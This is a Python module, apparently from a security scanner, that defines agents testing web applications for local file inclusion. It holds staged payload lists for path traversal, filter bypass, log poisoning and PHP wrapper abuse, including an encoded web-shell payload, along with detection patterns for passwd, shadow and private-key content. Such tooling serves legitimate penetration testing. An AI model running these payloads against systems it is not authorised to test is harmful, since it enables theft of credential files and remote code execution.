"""Local File Inclusion Agent - CWE-98."""

import re
from typing import Dict, List, Pattern

from ..base import BaseAgent, PayloadStage


class LFIAgent(BaseAgent):
    """
    Local File Inclusion (LFI) testing agent.

    Tests for file inclusion vulnerabilities including:
    - Basic path traversal
    - Null byte injection
    - PHP wrapper abuse
    - Log file inclusion

    Related to CWE-98 (Improper Control of Filename for Include/Require)
    """

    @property
    def vulnerability_type(self) -> str:
        return "lfi"

    @property
    def cweid(self) -> int:
        return 98

    @property
    def priority(self) -> int:
        return 8  # High priority - can lead to code execution

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                # Basic path traversal
                "../etc/passwd",
                "../../etc/passwd",
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../../../etc/passwd",
                "../../../../../../etc/passwd",
                # Windows variants
                "..\\windows\\win.ini",
                "..\\..\\windows\\win.ini",
                "..\\..\\..\\windows\\win.ini",
                # Absolute paths
                "/etc/passwd",
                "C:\\windows\\win.ini",
            ],
            PayloadStage.CONFIRM: [
                # Deep traversal
                "../../../../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..//..//..//..//etc/passwd",
                # With null byte (legacy)
                "../../../etc/passwd%00",
                "../../../etc/passwd\x00",
                "../../../etc/passwd%00.php",
                # URL encoding
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%2f..%2f..%2fetc%2fpasswd",
                # Double encoding
                "%252e%252e%252fetc%252fpasswd",
            ],
            PayloadStage.EXPLOIT: [
                # PHP wrappers (for code execution)
                "php://filter/convert.base64-encode/resource=/etc/passwd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://input",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
                "expect://id",
                # Log poisoning targets
                "/var/log/apache2/access.log",
                "/var/log/apache/access.log",
                "/var/log/nginx/access.log",
                "/var/log/httpd/access_log",
                "/proc/self/environ",
                "/proc/self/fd/2",
                # Windows sensitive files
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "C:\\inetpub\\logs\\LogFiles",
            ],
            PayloadStage.BYPASS: [
                # Filter bypass
                "....//....//etc/passwd",
                "....//..//..//etc/passwd",
                "../.../.././etc/passwd",
                # Case variations (Windows)
                "..\\..\\..\\WINDOWS\\win.ini",
                "..\\..\\..\\Windows\\Win.ini",
                # Unicode normalization
                "..%c0%af..%c0%afetc/passwd",
                "..%c1%9c..%c1%9cetc/passwd",
                # Long path
                "....//....//....//....//....//....//....//....//etc/passwd",
                # With suffix bypass
                "../../../etc/passwd%00.html",
                "../../../etc/passwd%0a.html",
                # Path truncation
                "../../../" + "a" * 2048 + "/../etc/passwd",
            ],
        }

    def get_detection_patterns(self) -> List[Pattern]:
        """Return patterns that indicate LFI vulnerability."""
        patterns = [
            # /etc/passwd content
            r"root:.*:0:0:",
            r"daemon:.*:1:1:",
            r"bin:.*:2:2:",
            r"sys:.*:3:3:",
            r"nobody:.*:65534:",
            r"www-data:.*:",
            r"mysql:.*:",
            r"/bin/bash",
            r"/bin/sh",
            r"/sbin/nologin",
            # /etc/shadow indicators (if readable)
            r"root:\$[0-9a-z]+\$",
            # win.ini content
            r"\[fonts\]",
            r"\[extensions\]",
            r"\[mci extensions\]",
            r"\[files\]",
            # PHP code indicators
            r"<\?php",
            r"<\?=",
            # Base64 encoded content (from php://filter)
            r"^[A-Za-z0-9+/]{100,}={0,2}$",
            # /proc/self/environ
            r"PATH=",
            r"DOCUMENT_ROOT=",
            r"SERVER_SOFTWARE=",
            r"HTTP_HOST=",
            # Log file patterns
            r"\[.*\]\s+\"GET\s+",
            r"\d+\.\d+\.\d+\.\d+\s+-\s+-",
            # Apache/Nginx access log
            r"HTTP/1\.[01]\"",
            # hosts file
            r"127\.0\.0\.1\s+localhost",
            # SSH keys (sensitive)
            r"-----BEGIN\s+(RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----",
            r"-----BEGIN\s+CERTIFICATE-----",
        ]
        return [re.compile(p, re.IGNORECASE | re.MULTILINE) for p in patterns]


class LFIPHPWrapperAgent(LFIAgent):
    """Specialized agent for PHP wrapper abuse."""

    @property
    def vulnerability_type(self) -> str:
        return "lfi_php_wrapper"

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/read=string.rot13/resource=index.php",
            ],
            PayloadStage.CONFIRM: [
                "php://filter/convert.base64-encode/resource=../config.php",
                "php://filter/convert.base64-encode/resource=../../config/database.php",
                "php://filter/convert.base64-encode/resource=/etc/passwd",
            ],
            PayloadStage.EXPLOIT: [
                "php://input",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "expect://id",
                "zip://path/to/file.zip#shell.php",
                "phar://path/to/file.phar/shell.php",
            ],
            PayloadStage.BYPASS: [
                "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
                "PHP://filter/convert.base64-encode/resource=index.php",
            ],
        }
